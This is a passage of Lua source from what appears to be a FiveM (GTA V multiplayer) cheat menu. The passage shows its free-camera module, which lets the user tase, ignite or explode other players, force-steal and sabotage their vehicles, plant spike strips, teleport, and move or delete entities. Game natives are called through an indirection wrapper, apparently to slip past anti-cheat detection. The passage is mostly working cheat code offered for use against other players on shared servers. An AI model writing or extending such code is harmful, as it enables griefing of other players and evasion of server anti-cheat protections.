                       ADRVSDD:GetFunction("TaskWanderStandard")(driver)
                       _stealing_ped = nil
                       _stealing = nil
                   end)
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["LEFTALT"]) then
                   CreateThread(function()
                       ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(ent)
       
                       if ADRVSDD:GetFunction("NetworkHasControlOfEntity")(ent) then
                           ADRVSDD:GetFunction("ModifyVehicleTopSpeed")(ent, 250000.0)
       
                           return ADRVSDD:AddNotification("SUCCESS", "Speed fucked!")
                       end
                   end)
               end
       
               self:DrawBoundingBox(ent, 122, 177, 220, 50)
               self:DrawInfoCard(ent)
           end
       
           function ADRVSDD.FreeCam:DoTaze(ent, endCoords)
               ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Taze"}, {"b_117", "Change Mode"}})
       
               if ADRVSDD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                   self:DrawBoundingBox(ent, 50, 122, 200, 50)
               end
       
               if IsDisabledControlJustPressed(0, ADRVSDD.Keys["MOUSE1"]) then
                   if ADRVSDD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                       ADRVSDD:TazePlayer(ent)
                   else
                       ADRVSDD:GetFunction("ShootSingleBulletBetweenCoords")(camX, camY, camZ, endCoords.x, endCoords.y, endCoords.z, 1, true, ADRVSDD:GetFunction("GetHashKey")("WEAPON_STUNGUN"), ADRVSDD:GetFunction("PlayerPedId")(), true, false, 24000.0)
                   end
               end
           end
       
           function ADRVSDD.FreeCam:DoHydrant(ent, endCoords)
               ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Hydrant"}, {"b_117", "Change Mode"}})
       
               if ADRVSDD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                   self:DrawBoundingBox(ent, 50, 122, 200, 50)
               end
       
               if IsDisabledControlJustPressed(0, ADRVSDD.Keys["MOUSE1"]) then
                   if ADRVSDD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                       ADRVSDD:HydrantPlayer(ent)
                   else
                       ADRVSDD:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 13, 100.0, false, false, 0.0)
                   end
               end
           end
       
           function ADRVSDD.FreeCam:DoFire(ent, endCoords)
               ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Fire"}, {"b_117", "Change Mode"}})
       
               if ADRVSDD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                   self:DrawBoundingBox(ent, 50, 122, 200, 50)
               end
       
               if IsDisabledControlJustPressed(0, ADRVSDD.Keys["MOUSE1"]) then
                   if ADRVSDD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                       ADRVSDD:FirePlayer(ent)
                   else
                       ADRVSDD:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 12, 100.0, false, false, 0.0)
                   end
               end
           end
       
           function ADRVSDD.FreeCam:DoExplosion(ent, endCoords)
               ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Explode"}, {"b_117", "Change Mode"}})
       
               if ADRVSDD:GetFunction("DoesEntityExist")(ent) and (_is_ped_player(ent) or ADRVSDD:GetFunction("IsEntityAVehicle")(ent)) then
                   self:DrawBoundingBox(ent, 50, 122, 200, 50)
               end
       
               if IsDisabledControlJustPressed(0, ADRVSDD.Keys["MOUSE1"]) then
                   if ADRVSDD:GetFunction("DoesEntityExist")(ent) and _is_ped_player(ent) then
                       ADRVSDD:GetFunction("AddExplosion")(ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0), 7, 100000.0, true, false, 0.0)
                   elseif ADRVSDD:GetFunction("DoesEntityExist")(ent) and ADRVSDD:GetFunction("IsEntityAVehicle")(ent) then
                       ADRVSDD:GetFunction("NetworkExplodeVehicle")(ent, true, false, false)
                   else
                       ADRVSDD:GetFunction("AddExplosion")(endCoords.x, endCoords.y, endCoords.z, 7, 100000.0, true, false, 0.0)
                   end
               end
           end
       
           local preview_spike_strip
           local spike_model = "p_ld_stinger_s"
       
           function ADRVSDD.FreeCam:DoSpikeStrips(ent, endCoords)
               if not preview_spike_strip then
                   preview_spike_strip = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z + 0.1, false, true, true)
               end
       
               local rot = ADRVSDD:GetFunction("GetCamRot")(self.Cam, 0)
               ADRVSDD:GetFunction("SetEntityCoords")(preview_spike_strip, endCoords.x, endCoords.y, endCoords.z + 0.1)
               ADRVSDD:GetFunction("SetEntityAlpha")(preview_spike_strip, 100)
               ADRVSDD:GetFunction("FreezeEntityPosition")(preview_spike_strip, true)
               ADRVSDD:GetFunction("SetEntityRotation")(preview_spike_strip, 0.0, 0.0, rot.z + 0.0)
               ADRVSDD:GetFunction("SetEntityCollision")(preview_spike_strip, false, false)
       
               if IsDisabledControlJustPressed(0, ADRVSDD.Keys["MOUSE1"]) then
                   rot = ADRVSDD:GetFunction("GetEntityRotation")(preview_spike_strip)
                   local spike_strip = ADRVSDD:GetFunction("CreateObject")(ADRVSDD:GetFunction("GetHashKey")(spike_model), endCoords.x, endCoords.y, endCoords.z - 0.2, true, true, true)
                   ADRVSDD:DoNetwork(spike_strip)
                   ADRVSDD:GetFunction("SetEntityRotation")(spike_strip, rot)
                   ADRVSDD:GetFunction("FreezeEntityPosition")(spike_strip, true)
               end
           end
       
           function ADRVSDD.FreeCam:DoDisable(ent, endCoords)
               if ADRVSDD:GetFunction("IsEntityAVehicle")(ent) then
                   if IsDisabledControlJustPressed(0, ADRVSDD.Keys["MOUSE1"]) then
                       ADRVSDD:DisableVehicle(ent)
                   end
       
                   self:DrawBoundingBox(ent, 50, 122, 200, 50)
               end
           end
       
           local _stealing
           local _stealing_ped
       
           function ADRVSDD.FreeCam:DoRCCar(ent, endCoords)
               ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTSHIFT"], 0), "Invisible"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["X"], 0), "Spawn (NPC)"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["R"], 0), "Release Car (If Active)"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE2"], 0), "Steal (NPC)"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Steal (Force)"}, {"b_117", "Change Mode"}})
       
               if _stealing then
                   self:DrawBoundingBox(_stealing_ped, 255, 122, 184, 50)
       
                   return self:DrawBoundingBox(_stealing, 255, 120, 255, 50)
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["R"]) and ADRVSDD.RCCar.On then
                   ADRVSDD:AddNotification("INFO", "Released RC Car!")
                   _stealing = nil
                   _stealing_ped = nil
       
                   return ADRVSDD:DoRCCar(false)
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE2"]) and self:CheckType(ent, "VEHICLE") then
                   CreateThread(function()
                       _stealing = ent
                       local model = ADRVSDD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ADRVSDD.FreeCam.SpawnerOptions.PED)]
       
                       if not ADRVSDD:RequestModelSync(model) then
                           _stealing = nil
       
                           return ADRVSDD:AddNotification("Failed to steal vehicle!")
                       end
       
                       local c = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0)
                       local x, y, z = c.x, c.y, c.z
                       local out, pos = ADRVSDD:GetFunction("GetClosestMajorVehicleNode")(x, y, z, 10.0, 0)
       
                       if not out then
                           pos = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(_stealing, 0.0, 0.0, 0.0) + vector3(dict.math.random(-3, 3), dict.math.random(-3, 3), 0)
                       end
       
                       local random_npc = ADRVSDD:GetFunction("CreatePed")(24, ADRVSDD:GetFunction("GetHashKey")(model), pos.x, pos.y, pos.z, 0.0, true, true)
                       _stealing_ped = random_npc
       
                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                           ADRVSDD:GetFunction("SetEntityVisible")(random_npc, false)
                       end
       
                       ADRVSDD:GetFunction("SetPedAlertness")(random_npc, 0.0)
                       local success = ADRVSDD:StealVehicleThread(random_npc, _stealing, true)
                       ADRVSDD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
                       ADRVSDD:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
                       local timeout = 0
       
                       if not success then
                           _stealing = nil
                           _stealing_ped = nil
       
                           return
                       end
       
                       while ADRVSDD:GetFunction("DoesEntityExist")(_stealing) and ADRVSDD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc and not ADRVSDD:GetFunction("IsEntityDead")(random_npc) and timeout <= 25000 do
                           timeout = timeout + 10
                           Wait(100)
                       end
       
                       if ADRVSDD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
                           _stealing = nil
       
                           return ADRVSDD:AddNotification("ERROR", "Failed to steal vehicle!")
                       end
       
                       ADRVSDD:DoRCCar(random_npc, _stealing)
                       _stealing_ped = nil
                       _stealing = nil
                   end)
               elseif ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) and self:CheckType(ent, "VEHICLE") then
                   CreateThread(function()
                       _stealing = ent
                       local model = ADRVSDD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ADRVSDD.FreeCam.SpawnerOptions.PED)]
       
                       if not ADRVSDD:RequestModelSync(model) then
                           _stealing = nil
       
                           return ADRVSDD:AddNotification("ERROR", "Failed to steal vehicle!")
                       end
       
                       ADRVSDD:GetFunction("ClearPedTasksImmediately")(ADRVSDD:GetFunction("GetPedInVehicleSeat")(_stealing, -1))
                       local random_npc = ADRVSDD:GetFunction("CreatePedInsideVehicle")(_stealing, 24, ADRVSDD:GetFunction("GetHashKey")(model), -1, true, true)
       
                       if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                           ADRVSDD:GetFunction("SetEntityVisible")(random_npc, false)
                       end
       
                       ADRVSDD:GetFunction("SetPedAlertness")(random_npc, 0.0)
                       ADRVSDD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
                       ADRVSDD:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
                       _stealing_ped = random_npc
       
                       if ADRVSDD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
                           _stealing = nil
       
                           return ADRVSDD:AddNotification("ERROR", "Failed to steal vehicle!")
                       end
       
                       ADRVSDD:DoRCCar(random_npc, _stealing)
                       _stealing_ped = nil
                       _stealing = nil
                   end)
               elseif ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["X"]) then
                   CreateThread(function()
                       local modelName = ADRVSDD:GetTextInput("Enter vehicle spawn name", "", 20)
                       if modelName == "" or not ADRVSDD:RequestModelSync(modelName) then return ADRVSDD:AddNotification("ERROR", "That is not a vaild vehicle model.", 10000) end
       
                       if modelName then
                           local car = ADRVSDD:GetFunction("CreateVehicle")(ADRVSDD:GetFunction("GetHashKey")(modelName), endCoords.x, endCoords.y, endCoords.z, dict.math.random(-360, 360) + 0.0, true, false)
       
                           if ADRVSDD:GetFunction("DoesEntityExist")(car) then
                               _stealing = car
                               local model = ADRVSDD.FreeCam.SpawnerOptions.PED[dict.math.random(1, #ADRVSDD.FreeCam.SpawnerOptions.PED)]
       
                               if not ADRVSDD:RequestModelSync(model) then
                                   _stealing = nil
       
                                   return ADRVSDD:AddNotification("ERROR", "Failed to steal vehicle!")
                               end
       
                               ADRVSDD:GetFunction("ClearPedTasksImmediately")(ADRVSDD:GetFunction("GetPedInVehicleSeat")(_stealing, -1))
                               local random_npc = ADRVSDD:GetFunction("CreatePedInsideVehicle")(_stealing, 24, ADRVSDD:GetFunction("GetHashKey")(model), -1, true, true)
                               ADRVSDD:GetFunction("SetPedAlertness")(random_npc, 0.0)
                               ADRVSDD:GetFunction("TaskSetBlockingOfNonTemporaryEvents")(random_npc, true)
                               ADRVSDD:GetFunction("TaskVehicleDriveWander")(random_npc, _stealing, 1000.0, 0)
                               _stealing_ped = random_npc
       
                               if ADRVSDD:GetFunction("GetPedInVehicleSeat")(_stealing, -1) ~= random_npc then
                                   _stealing = nil
       
                                   return ADRVSDD:AddNotification("ERROR", "Failed to steal vehicle!")
                               end
       
                               ADRVSDD:DoRCCar(random_npc, _stealing)
                               _stealing_ped = nil
                               _stealing = nil
                           end
                       end
                   end)
               end
       
               self:DrawBoundingBox(ent, 255, 255, 120, 50)
               self:DrawInfoCard(ent)
           end
       
           function ADRVSDD.FreeCam:ManipulationLogic(cam, x, y, z)
               if ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= -1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 1 and ADRVSDD:GetFunction("UpdateOnscreenKeyboard")() ~= 2 then return end
               self:Crosshair((ADRVSDD:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and ADRVSDD:GetFunction("DoesEntityExist")(self.HoveredEntity)) or (ADRVSDD:GetFunction("DoesEntityHaveDrawable")(self.DraggingEntity) and ADRVSDD:GetFunction("DoesEntityExist")(self.DraggingEntity)))
               local rightVec, forwardVec, upVec = ADRVSDD:GetFunction("GetCamMatrix")(cam)
               local curVec = vector3(x, y, z)
               local targetVec = curVec + forwardVec * 150
               local handle = ADRVSDD:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1)
               local _, hit, endCoords, _, entity = ADRVSDD:GetFunction("GetShapeTestResult")(handle)
       
               if self.DraggingEntity and not ADRVSDD:GetFunction("DoesEntityExist")(self.DraggingEntity) then
                   self.DraggingEntity = nil
                   self.Rotating = nil
                   lift_height = 0.0
                   lift_inc = 0.1
       
                   return
               end
       
               if ADRVSDD.Showing then return end
       
               if notif_alpha > 0 then
                   offX = _lerp(0.1, offX, 429)
               else
                   offX = _lerp(0.1, offX, 0)
               end
       
               if not hit then
                   endCoords = targetVec
               end
       
               if preview_spike_strip and ADRVSDD:GetFunction("DoesEntityExist")(preview_spike_strip) and self.Mode ~= self.Modes["SPIKE_STRIPS"] then
                   ADRVSDD.Util:DeleteEntity(preview_spike_strip)
                   preview_spike_strip = nil
               end
       
               if self:CheckType(entity, "ALL") then
                   self.HoveredEntity = entity
               else
                   self.HoveredEntity = nil
               end
       
               if self.Mode == self.Modes["REMOVER"] then return self:Remover(entity, "ALL") end
               ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Select"}, {"b_117", "Change Mode"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["E"], 0), "Clone"}})
       
               if self.Mode == self.Modes["PED_SPAWNER"] then
                   self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PED")
               elseif self.Mode == self.Modes["OBJ_SPAWNER"] then
                   self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "OBJECT")
               elseif self.Mode == self.Modes["VEH_SPAWNER"] then
                   self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "VEHICLE")
               elseif self.Mode == self.Modes["PREMADE_SPAWNER"] then
                   self:Spawner(endCoords, GetGameplayCamRelativeHeading(), "PREMADE")
               elseif self.Mode == self.Modes["TELEPORT"] then
                   ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Teleport"}, {"b_117", "Change Mode"}})
       
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) and not ADRVSDD.Showing and hit then
                       ADRVSDD:GetFunction("SetEntityCoords")(ADRVSDD:GetFunction("PlayerPedId")(), endCoords.x, endCoords.y, endCoords.z)
                       ADRVSDD:AddNotification("INFO", "Teleported!", 2500)
                   end
       
                   return
               elseif self.Mode == self.Modes["RC_CAR"] then
                   return self:DoRCCar(self.HoveredEntity, endCoords)
               elseif self.Mode == self.Modes["STEAL"] then
                   return self:DoSteal(self.HoveredEntity)
               elseif self.Mode == self.Modes["TAZE"] then
                   return self:DoTaze(self.HoveredEntity, endCoords)
               elseif self.Mode == self.Modes["HYDRANT"] then
                   return self:DoHydrant(self.HoveredEntity, endCoords)
               elseif self.Mode == self.Modes["FIRE"] then
                   return self:DoFire(self.HoveredEntity, endCoords)
               elseif self.Mode == self.Modes["SPIKE_STRIPS"] then
                   return self:DoSpikeStrips(self.HoveredEntity, endCoords)
               elseif self.Mode == self.Modes["DISABLE_VEHICLE"] then
                   return self:DoDisable(self.HoveredEntity, endCoords)
               elseif self.Mode == self.Modes["EXPLODE"] then
                   return self:DoExplosion(self.HoveredEntity, endCoords)
               end
       
               if ADRVSDD:GetFunction("DoesEntityExist")(self.DraggingEntity) then
                   if frozen_ents[self.DraggingEntity] == nil then
                       frozen_ents[self.DraggingEntity] = true
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["DELETE"]) and not ADRVSDD.Showing then
                       if self.DraggingEntity == ADRVSDD:GetFunction("PlayerPedId")() then return ADRVSDD:AddNotification("ERROR", "You can not delete yourself!", 10000) end
                       if _is_ped_player(self.DraggingEntity) then return ADRVSDD:AddNotification("ERROR", "You can not delete players!", 10000) end
                       self:DrawBoundingBox(self.DraggingEntity, 255, 50, 50, 50)
                       ADRVSDD:AddNotification("INFO", "Deleted ~y~" .. dict.tostring(self.DraggingEntity) .. "~w~", 10000)
                       ADRVSDD.Util:DeleteEntity(self.DraggingEntity)
                       self.DraggingEntity = nil
                       lift_height = 0.0
                       lift_inc = 0.1
                       self.Rotating = nil
       
                       return
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["E"]) then
                       self:Clone(self.DraggingEntity)
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE2"]) and not ADRVSDD.Showing then
                       local data = self.DraggingData
       
                       if data then
                           ADRVSDD:GetFunction("SetEntityCoords")(self.DraggingEntity, data.Position.x, data.Position.y, data.Position.z)
                           ADRVSDD:GetFunction("SetEntityRotation")(self.DraggingEntity, data.Rotation.x, data.Rotation.y, data.Rotation.z)
                       end
       
                       self.DraggingEntity = nil
                       lift_height = 0.0
                       lift_inc = 0.1
                       self.Rotating = nil
       
                       return
                   elseif ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) and not ADRVSDD.Showing then
                       self.DraggingEntity = nil
                       lift_height = 0.0
                       lift_inc = 0.1
                       self.Rotating = nil
       
                       return
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["R"]) and not ADRVSDD.Showing then
                       self.Rotating = not self.Rotating
                       local rot = ADRVSDD:GetFunction("GetEntityRotation")(self.DraggingEntity)
                       rotP, rotY, rotR = rot.x, rot.y, rot.z
                   end
       
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["LEFTALT"]) and not self.Rotating then
                       frozen_ents[self.DraggingEntity] = not frozen_ents[self.DraggingEntity]
                   end
       
                   ADRVSDD:GetFunction("FreezeEntityPosition")(self.DraggingEntity, frozen_ents[entity])
       
                   if self.Rotating and not ADRVSDD.Showing then
                       self:DrawBoundingBox(self.DraggingEntity, 255, 125, 50, 50)
                       ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["R"], 0), "Exit Rotate Mode"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE2"], 0), "Reset Position"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Stop Dragging"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTSHIFT"], 0), "Snap Nearest 45 Degrees"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTALT"], 0), "Increment x" .. (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTALT"]) and 1.0 or 15.0)}, {"t_D%t_A", "Roll"}, {"t_W%t_S", "Pitch"}, {"b_2000%t_X", "Yaw"}})
       
                       if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["D"]) then
                           rotR = rotR + (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTALT"]) and 1.0 or 15.0)
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                               rotR = _snap(rotR)
                           end
                       end
       
                       if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["A"]) then
                           rotR = rotR - (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTALT"]) and 1.0 or 15.0)
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                               rotR = _snap(rotR)
                           end
                       end
       
                       if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["W"]) then
                           rotP = rotP - (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTALT"]) and 1.0 or 15.0)
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                               rotP = _snap(rotP)
                           end
                       end
       
                       if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["S"]) then
                           rotP = rotP + (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTALT"]) and 1.0 or 15.0)
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                               rotP = _snap(rotP)
                           end
                       end
       
                       if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["SPACE"]) then
                           rotY = rotY - (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTALT"]) and 1.0 or 15.0)
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                               rotY = _snap(rotY)
                           end
                       end
       
                       if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["X"]) then
                           rotY = rotY + (ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTALT"]) and 1.0 or 15.0)
       
                           if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) then
                               rotY = _snap(rotY)
                           end
                       end
       
                       ADRVSDD:GetFunction("SetEntityRotation")(self.DraggingEntity, rotP + 0.0, rotY + 0.0, rotR + 0.0)
                       self:DrawInfoCard(self.DraggingEntity)
       
                       return ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)
                   end
       
                   local handleTrace = ADRVSDD:GetFunction("StartShapeTestRay")(curVec.x, curVec.y, curVec.z, targetVec.x, targetVec.y, targetVec.z, -1, self.DraggingEntity)
                   local _, hit, endPos, _, _ = ADRVSDD:GetFunction("GetShapeTestResult")(handleTrace)
                   local c = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(self.DraggingEntity, 0.0, 0.0, 0.0)
                   local cX, cY, cZ = c.x, c.y, c.z
                   local cam_rot = ADRVSDD:GetFunction("GetCamRot")(self.Cam, 0)
                   local rot = ADRVSDD:GetFunction("GetEntityRotation")(self.DraggingEntity)
                   ADRVSDD:GetFunction("SetEntityRotation")(self.DraggingEntity, rot.x, rot.y, cam_rot.z + 0.0)
       
                   if IsDisabledControlJustPressed(0, ADRVSDD.Keys["["]) then
                       lift_inc = lift_inc + 0.05
       
                       if lift_inc <= 0.01 then
                           lift_inc = 0.01
                       elseif lift_inc >= 3 then
                           lift_inc = 3
                       end
                   end
       
                   if IsDisabledControlJustPressed(0, ADRVSDD.Keys["]"]) then
                       lift_inc = lift_inc - 0.05
       
                       if lift_inc <= 0.01 then
                           lift_inc = 0.01
                       elseif lift_inc >= 3 then
                           lift_inc = 3
                       end
                   end
       
                   if IsDisabledControlPressed(0, ADRVSDD.Keys["C"]) then
                       lift_height = lift_height + lift_inc
                   end
       
                   if IsDisabledControlPressed(0, ADRVSDD.Keys["Z"]) then
                       lift_height = lift_height - lift_inc
                   end
       
                   if hit then
                       ADRVSDD:GetFunction("SetEntityCoords")(self.DraggingEntity, endPos.x, endPos.y, endPos.z + lift_height)
                       self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)
                   else
                       ADRVSDD:GetFunction("SetEntityCoords")(self.DraggingEntity, targetVec.x, targetVec.y, targetVec.z + lift_height)
                       self:DrawBoundingBox(self.DraggingEntity, 50, 255, 50, 50)
                   end
       
                   self:DrawInfoCard(self.DraggingEntity)
                   ADRVSDD:SetIbuttons({{ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["C"], 0), "Lift Up (+" .. lift_inc .. ")"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["Z"], 0), "Push Down (-" .. lift_inc .. ")"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["R"], 0), "Rotate"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["LEFTALT"], 0), "Toggle Frozen"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE2"], 0), "Reset Position"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["MOUSE1"], 0), "Stop Dragging"}, {ADRVSDD:GetFunction("GetControlInstructionalButton")(0, ADRVSDD.Keys["E"], 0), "Clone"}})
       
                   return ADRVSDD:GetFunction("NetworkRequestControlOfEntity")(self.DraggingEntity)
               end
       
               local ent = ADRVSDD:GetFunction("DoesEntityExist")(self.DraggingEntity) and self.DraggingEntity or self.HoveredEntity
       
               if ADRVSDD:GetFunction("DoesEntityExist")(ent) and ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["E"]) then
                   self:Clone(ent)
               end
       
               if ADRVSDD:GetFunction("IsDisabledControlPressed")(0, ADRVSDD.Keys["LEFTSHIFT"]) or beginning_target ~= nil then return self:PedTarget(cam, x, y, z) end
       
               if ADRVSDD:GetFunction("DoesEntityExist")(self.HoveredEntity) and ADRVSDD:GetFunction("DoesEntityHaveDrawable")(self.HoveredEntity) and not ADRVSDD:GetFunction("DoesEntityExist")(self.DraggingEntity) then
                   if ADRVSDD:GetFunction("IsDisabledControlJustPressed")(0, ADRVSDD.Keys["MOUSE1"]) and not ADRVSDD.Showing and not _is_ped_player(self.HoveredEntity) then
                       self.DraggingEntity = self.HoveredEntity
       
                       self.DraggingData = {
                           Position = ADRVSDD:GetFunction("GetOffsetFromEntityInWorldCoords")(self.HoveredEntity, 0.0, 0.0, 0.0),
                           Rotation = ADRVSDD:GetFunction("GetEntityRotation")(self.HoveredEntity)
                       }
                   else
                       self:DrawBoundingBox(self.HoveredEntity, 255, 255, 255, 50)
                       self:DrawInfoCard(self.HoveredEntity)
                   end
               end
           end
       
           function ADRVSDD.FreeCam:DisableMovement(off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 30, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 31, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 32, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 33, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 34, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 35, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 36, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 37, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 38, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 44, off)
               ADRVSDD:GetFunction("DisableControlAction")(1, 45, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 63, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 64, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 71, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 72, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 75, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 278, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 279, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 280, off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 281, off)
               ADRVSDD:GetFunction("DisablePlayerFiring")(ADRVSDD:GetFunction("PlayerId")(), off)
               ADRVSDD:GetFunction("DisableControlAction")(0, 24, off)
